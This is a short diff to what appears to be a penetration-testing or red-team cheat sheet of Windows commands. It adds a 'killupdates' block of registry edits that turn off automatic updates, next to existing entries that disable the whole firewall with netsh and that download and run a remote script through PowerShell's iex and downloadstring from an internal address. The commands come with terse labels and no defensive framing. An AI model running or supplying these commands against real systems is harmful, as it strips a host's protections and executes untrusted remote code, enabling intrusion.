@@ -332,6 +332,13 @@ killfw
 ```
 netsh advfirewall set allprofiles state off
 ```
+killupdates
+```
+Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU' -name "NoAutoUpdate" -value 1
+Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU' -name "NoAutoRebootWithLoggedOnUsers" -value 1
+Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU' -name "AutoInstallMinorUpdates" -value 0
+Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU' -name "AUOptions" -value 2
+```
 laps alternative (if laps.txt isn't working) (switch domain if have to)
 ```
 iex(new-object net.webclient).downloadstring('http://192.168.10.11/view.txt')
